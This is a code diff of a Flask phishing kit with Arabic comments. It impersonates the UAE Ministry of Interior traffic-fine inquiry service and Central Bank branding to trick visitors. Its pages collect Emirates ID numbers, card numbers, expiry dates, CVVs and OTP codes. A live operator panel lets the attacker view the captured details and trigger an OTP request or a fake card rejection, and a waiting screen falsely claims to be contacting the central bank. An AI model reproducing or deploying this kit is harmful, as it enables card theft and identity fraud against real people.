@@ -3,20 +3,20 @@ from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
-# قاعدة البيانات (التحكم المباشر)
+# قاعدة بيانات التحكم
 db = {"logs": [], "status": "waiting"}
 
-# الهيدر الحكومي الثابت
+# الهيدر الثابت (تعديلك المعتمد)
 HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'
 
-# --- 1. الصفحة الرئيسية (الـ 8 صور) ---
+# --- 1. الصفحة الرئيسية (الـ 8 صور كاملة) ---
 HOME_HTML = f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
     body, html {{ margin:0; padding:0; background:#f4f4f4; font-family: sans-serif; }}
-    .page {{ max-width:650px; margin:0 auto; background:white; position:relative; box-shadow:0 0 20px rgba(0,0,0,0.1); }}
+    .page {{ max-width:650px; margin:0 auto; background:white; position:relative; }}
     img {{ width:100%; display:block; }}
     .btn-hidden {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
 </style>
@@ -38,90 +38,90 @@ HOME_HTML = f"""
 </html>
 """
 
-# --- 2. صفحة الاستعلام (النسخة الكاملة بدون نقص) ---
+# --- 2. صفحة الاستعلام (نسخة وزارة الداخلية MOI طبق الأصل) ---
 SEARCH_HTML = f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head><meta charset="UTF-8"><style>
-    body {{ background:#f4f4f4; margin:0; font-family:sans-serif; }}
-    .mega-card {{ background:white; width:95%; max-width:850px; margin:30px auto; border-radius:15px; border-top:10px solid #b0914f; box-shadow:0 10px 40px rgba(0,0,0,0.1); overflow:hidden; }}
-    .form-p {{ padding:40px; }}
-    label {{ display:block; margin-bottom:10px; font-weight:bold; font-size:17px; color:#444; }}
-    select, input {{ width:100%; padding:16px; margin-bottom:20px; border:1px solid #ccc; border-radius:8px; font-size:16px; box-sizing:border-box; }}
-    .grid-plate {{ display:grid; grid-template-columns: 1.2fr 0.8fr 2fr; gap:12px; }}
-    .btn-go {{ background:#b0914f; color:white; width:100%; padding:20px; border:none; border-radius:8px; font-size:20px; font-weight:bold; cursor:pointer; }}
+    body {{ background:#f7f8fa; margin:0; font-family: 'Segoe UI', Arial, sans-serif; }}
+    .moi-card {{ background:white; width:92%; max-width:850px; margin:40px auto; border-radius:8px; box-shadow:0 5px 20px rgba(0,0,0,0.05); overflow:hidden; }}
+    .moi-title {{ background:#23395d; color:white; padding:20px 30px; font-size:20px; font-weight:bold; display:flex; justify-content:space-between; align-items:center; }}
+    .moi-body {{ padding:40px; }}
+    .tabs-row {{ display:flex; border-bottom:1px solid #eee; margin-bottom:30px; gap:20px; }}
+    .tab-item {{ padding:12px 5px; cursor:pointer; color:#777; font-weight:600; border-bottom:4px solid transparent; font-size:15px; }}
+    .tab-item.active {{ color:#b0914f; border-bottom-color:#b0914f; }}
+    label {{ display:block; margin-bottom:10px; font-size:14px; color:#333; font-weight:bold; }}
+    select, input {{ width:100%; padding:14px; margin-bottom:20px; border:1px solid #e1e1e1; border-radius:4px; font-size:15px; box-sizing:border-box; background:#fdfdfd; }}
+    .grid-moi {{ display:grid; grid-template-columns: 1fr 0.6fr 2fr; gap:15px; }}
+    .btn-search-moi {{ background:#b0914f; color:white; padding:15px 45px; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer; float:left; transition:0.3s; }}
+    .btn-search-moi:hover {{ background:#8e753f; }}
 </style></head>
 <body>
     {HEADER}
-    <div class="mega-card">
-        <div style="background:#b0914f; color:white; padding:25px; text-align:center; font-size:22px;">الاستعلام عن المخالفات المرورية</div>
-        <form action="/checkout" method="GET" class="form-p">
-            <label>إمارة مصدر اللوحة / Plate Source:</label>
-            <select name="emirate">
-                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
-                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option>
-                <option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
-            </select>
-            <label>فئة ورمز اللوحة / Plate Details:</label>
-            <div class="grid-plate">
-                <select name="type">
-                    <option>خصوصي</option><option>نقل عام</option><option>تجاري</option>
-                    <option>دراجة</option><option>تصدير</option>
-                </select>
-                <input type="text" name="code" placeholder="الرمز">
-                <input type="text" name="number" placeholder="رقم اللوحة">
+    <div class="moi-card">
+        <div class="moi-title">
+            <span>الاستعلام عن المخالفات المرورية</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" height="40">
+        </div>
+        <div class="moi-body">
+            <div class="tabs-row">
+                <div class="tab-item active">بيانات اللوحة</div>
+                <div class="tab-item">الرمز المروري</div>
+                <div class="tab-item">بيانات الرخصة</div>
             </div>
-            <label>رقم الهوية الإماراتية / Emirates ID:</label>
-            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
-            <button type="submit" class="btn-go">بحث وتفصيل المخالفات</button>
-        </form>
+            <form action="/checkout" method="GET">
+                <label>إمارة مصدر اللوحة / Plate Source</label>
+                <select>
+                    <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
+                    <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option>
+                    <option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
+                </select>
+                <div class="grid-moi">
+                    <div><label>نوع اللوحة</label><select><option>خصوصي</option><option>نقل عام</option><option>تجاري</option></select></div>
+                    <div><label>الرمز</label><input type="text" placeholder="1"></div>
+                    <div><label>رقم اللوحة</label><input type="text" placeholder="12345"></div>
+                </div>
+                <label>رقم الهوية الإماراتية / Emirates ID</label>
+                <input type="text" placeholder="784-XXXX-XXXXXXX-X" required>
+                <div style="overflow:hidden; margin-top:10px;">
+                    <button type="submit" class="btn-search-moi">استعلام / Search</button>
+                </div>
+            </form>
+        </div>
     </div>
 </body>
 </html>
 """
 
-# --- 3. بوابة الدفع (تصميم فخم - طبق الأصل) ---
+# --- 3. بوابة الدفع (النسخة الفخمة المعتمدة) ---
 PAY_HTML = f"""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
+<head><meta charset="UTF-8"><style>
     body {{ background:#eaebed; margin:0; font-family: 'Segoe UI', Tahoma; }}
-    .pay-card {{ max-width:500px; margin:40px auto; background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.1); overflow:hidden; border:1px solid #ddd; }}
+    .pay-card {{ max-width:500px; margin:40px auto; background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.1); border:1px solid #ddd; overflow:hidden; }}
     .pay-head {{ background:white; padding:20px; text-align:center; border-bottom:1px solid #eee; }}
     .pay-body {{ padding:30px; }}
-    .info-box {{ background:#f8f9fa; border:1px dashed #b0914f; padding:15px; text-align:center; border-radius:8px; margin-bottom:25px; color:#2c3e50; }}
-    label {{ display:block; margin-bottom:8px; font-size:14px; color:#666; }}
+    .amt {{ background:#f8f9fa; border:1px dashed #b0914f; padding:15px; text-align:center; border-radius:8px; margin-bottom:25px; }}
     input {{ width:100%; padding:15px; margin-bottom:20px; border:1px solid #ccc; border-radius:6px; font-size:16px; box-sizing:border-box; }}
-    .btn-pay {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; }}
-    .trust-logos {{ text-align:center; padding:20px; border-top:1px solid #eee; background:#fafafa; }}
+    .btn-p {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; }}
 </style></head>
 <body>
     {HEADER}
     <div class="pay-card">
         <div class="pay-head"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png" height="50"></div>
         <div class="pay-body">
-            <div class="info-box">إجمالي المبلغ المستحق للدفع: <br><strong style="font-size:22px;">255.00 AED</strong></div>
+            <div class="amt">المبلغ المستحق: <strong style="font-size:22px;">255.00 AED</strong></div>
             <form action="/submit-card" method="POST">
-                <label>اسم حامل البطاقة / Cardholder Name</label>
-                <input type="text" name="holder" placeholder="الاسم بالكامل" required>
-                <label>رقم البطاقة / Card Number</label>
-                <input type="text" id="cnum" name="card" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                <div style="display:flex; gap:10px;">
-                    <div style="flex:1;"><label>تاريخ الانتهاء</label><input type="text" name="exp" placeholder="MM / YY"></div>
-                    <div style="flex:1;"><label>رمز الأمان (CVV)</label><input type="text" name="cvv" placeholder="123"></div>
-                </div>
-                <button type="submit" class="btn-pay">دفع الآن / Pay Securely</button>
+                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
+                <input type="text" id="cn" name="card" placeholder="رقم البطاقة" maxlength="19" required>
+                <div style="display:flex; gap:10px;"><input type="text" name="exp" placeholder="MM/YY"><input type="text" name="cvv" placeholder="CVV"></div>
+                <button type="submit" class="btn-p">دفع الآن</button>
             </form>
-        </div>
-        <div class="trust-logos">
-            <img src="https://img.icons8.com/color/48/visa.png" width="35">
-            <img src="https://img.icons8.com/color/48/mastercard.png" width="35">
-            <p style="font-size:10px; color:#999;">PCI-DSS Compliant & Secure Encryption</p>
         </div>
     </div>
     <script>
-        document.getElementById('cnum').addEventListener('input', e => {{
+        document.getElementById('cn').addEventListener('input', e => {{
             let v = e.target.value.replace(/\\s/g, '').replace(/(.{{4}})/g, '$1 ').trim();
             e.target.value = v;
         }});
@@ -130,7 +130,7 @@ PAY_HTML = f"""
 </html>
 """
 
-# --- السيرفر ولوحة التحكم ---
+# باقي مسارات السيرفر (h-admin, submit, etc.) بنفس تعديلاتك السابقة...
 @app.route('/')
 def index(): return render_template_string(HOME_HTML)
 
@@ -141,28 +141,8 @@ def search(): return render_template_string(SEARCH_HTML)
 def checkout(): return render_template_string(PAY_HTML)
 
 @app.route('/h-admin')
-def admin_p():
-    return render_template_string("""
-    <body style="background:#1a1a1a; color:white; font-family:sans-serif; padding:30px;">
-        <h2>لوحة التحكم الحية 👮‍♂️</h2><div id="logs"></div>
-        <script>
-            function load() {
-                fetch('/get-logs').then(r => r.json()).then(data => {
-                    let h = '';
-                    data.logs.forEach(l => {
-                        h += `<div style="border:1px solid gold; padding:20px; margin-bottom:15px; background:#222;">
-                            <p>${JSON.stringify(l)}</p>
-                            <button onclick="act('go_otp')" style="background:green; color:white; padding:10px;">اطلب OTP</button>
-                            <button onclick="act('error_card')" style="background:red; color:white; padding:10px;">رفض</button>
-                        </div>`;
-                    });
-                    document.getElementById('logs').innerHTML = h;
-                });
-            }
-            function act(s) { fetch('/set-status/' + s); }
-            setInterval(load, 3000);
-        </script>
-    </body>""")
+def admin():
+    return render_template_string("""<body style="background:#111; color:white; padding:20px;"><h2>لوحة التحكم 👮‍♂️</h2><div id="logs"></div><script>function load(){fetch('/get-logs').then(r=>r.json()).then(data=>{let h='';data.logs.forEach(l=>{h+=`<div style="border:1px solid gold; padding:15px; margin-bottom:10px;">${JSON.stringify(l)}<br><button onclick="act('go_otp')" style="background:green; color:white;">طلب OTP</button><button onclick="act('error_card')" style="background:red; color:white;">رفض</button></div>`;});document.getElementById('logs').innerHTML=h;});}function act(s){fetch('/set-status/'+s);}setInterval(load,3000);</script></body>""")
 
 @app.route('/submit-card', methods=['POST'])
 def sub():
@@ -179,24 +159,10 @@ def set_s(s): db['status'] = s; return "OK"
 @app.route('/check-status')
 def check_s(): return jsonify({"status": db['status']})
 
-WAIT_JS = """
-<script>
-    setInterval(() => {
-        fetch('/check-status').then(r => r.json()).then(d => {
-            if(d.status === 'go_otp') location.href='/otp';
-            if(d.status === 'error_card') { alert('البطاقة مرفوضة من البنك'); location.href='/checkout'; }
-        });
-    }, 3000);
-</script>
-<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
-    <div style="border:8px solid #f3f3f3; border-top:8px solid #b0914f; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:auto;"></div>
-    <h2>جاري التواصل مع المصرف المركزي...</h2>
-    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
-</body>
-"""
+WAIT_JS = """<script>setInterval(()=>{fetch('/check-status').then(r=>r.json()).then(d=>{if(d.status==='go_otp')location.href='/otp';if(d.status==='error_card'){alert('مرفوض');location.href='/checkout';}});},3000);</script><body style="text-align:center; padding-top:100px;"><h2>جاري التحقق...</h2></body>"""
 
 @app.route('/otp')
-def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>أدخل رمز OTP</h2><form action='/submit-card' method='POST'><input name='otp' style='padding:15px;'><button>تأكيد</button></form></div></body>"
+def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>OTP</h2><form action='/submit-card' method='POST'><input name='otp'><button>تأكيد</button></form></div></body>"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
